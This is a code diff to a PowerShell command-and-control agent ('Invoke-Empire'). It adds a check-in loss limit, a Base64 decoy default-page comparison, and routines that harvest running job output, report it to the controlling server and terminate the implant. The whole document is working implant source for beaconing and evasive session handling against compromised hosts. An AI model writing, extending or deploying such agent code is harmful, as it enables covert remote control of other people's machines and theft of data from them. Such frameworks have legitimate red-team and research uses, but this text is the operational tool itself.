@@ -32,6 +32,12 @@ function Invoke-Empire {
 
         .PARAMETER Epoch
         server epoch time, defaults to client time
+
+        .PARAMETER LostLimit
+        The limit of the number of checkins the agent will miss before exiting
+
+        .PARAMETER DefaultPage
+        The default page string Base64 encoded
     #>
 
     param(
@@ -65,7 +71,13 @@ function Invoke-Empire {
         $Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
         [Int32]
-        $Epoch = [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s")))
+        $Epoch = [math]::abs([Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat "%s"))),
+
+        [Int32]
+        $LostLimit = 60,
+
+        [String]
+        $DefaultPage = ""
     )
 
     ############################################################
@@ -74,6 +86,9 @@ function Invoke-Empire {
     
     $script:AgentDelay = $AgentDelay
     $script:AgentJitter = $AgentJitter
+    $script:LostLimit = $LostLimit
+    $script:MissedCheckins = 0
+    $script:DefaultPage = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultPage))
     
     $encoding = [System.Text.Encoding]::ASCII
 
@@ -149,6 +164,22 @@ function Invoke-Empire {
     # get the delay/jitter
     function Get-Delay {
         "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter"
+    }
+
+    function Set-LostLimit {
+        param([int]$l)
+        $script:LostLimit = $l
+        if($l -eq 0)
+        {
+            "agent set to never die based on checkin Limit"
+        }
+        else 
+        {
+            "agent LostLimit set to $script:LostLimit"
+        }
+    }
+    function Get-LostLimit {
+        "agent LostLimit: $script:LostLimit"
     }
 
     # set the killdate for the agent
@@ -882,7 +913,8 @@ function Invoke-Empire {
             }
         }
         catch [Net.WebException] {
-            # handle 403? for key-negotiation?
+            $script:MissedCheckins+=1
+
             # handle host not found/reachable?
             # if($_.Exception -match "(403)"){
             #     Write-Host "403!!"
@@ -925,6 +957,34 @@ function Invoke-Empire {
             # send an exit status message and die
             # $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
             $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
+            Send-Message $(Encode-Packet -type 2 -data $msg)
+
+            exit
+        }
+        if((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit))
+        {
+
+            # get any job results and kill the jobs
+            $packets = $null
+            Get-Job -name ($JobNameBase + "*") | %{
+                # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
+                # $data = Receive-Job $_ | fl | Out-String
+                $data = Receive-Job $_
+
+                if ($data -is [system.array]){
+                    $data = $data -join ""
+                }
+                $data = $data | fl | Out-String
+
+                if($data){
+                    $packets += $(Encode-Packet -type 110 -data $($data))
+                }
+                Stop-Job $_
+                Remove-Job $_
+            }
+
+            # send an exit status message and die
+            $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
             Send-Message $(Encode-Packet -type 2 -data $msg)
 
             exit
@@ -989,21 +1049,32 @@ function Invoke-Empire {
             # get the next task from the server
             $data = Get-Task
 
-            # make sure there's a result and it doesn't begin with "<html>" (i.e. the default page)
-            if ($data -and (-not ([System.Text.Encoding]::UTF8.GetString($data[0..5]) -eq "<html>"))){
-                # check if an error was received
-                if ($data.GetType().Name -eq "ErrorRecord"){
-                    $statusCode = [int]$_.Exception.Response.StatusCode
-                    # TODO: handle error codes appropriately?
-                    if ($statusCode -eq 0){
-                        # host unreachable... backup server?
-                    }
+            #Check to see if we got data
+            if ($data) {
+                #did we get a default page
+                if ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage) {
+                    $script:MissedCheckins=0
                 }
-                # if we get data, process the packet
-                Process-Tasking $data
-            }
-            else{
-                # TODO: do we need to process the error?
+                #we did not get a default, check for erros and process the tasking
+                elseif (-not ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage)) {
+                    # check if an error was received
+                    if ($data.GetType().Name -eq "ErrorRecord"){
+                        $statusCode = [int]$_.Exception.Response.StatusCode
+                        if ($statusCode -eq 0){
+
+                        }
+                    }
+                    else {
+                        # if we get data with no error, process the packet
+                        $script:MissedCheckins=0
+                        Process-Tasking $data
+                    }
+
+                }
+                else {
+                    #No data... wierd?
+                
+                }
             }
             # force garbage collection to clean up :)
             [GC]::Collect()
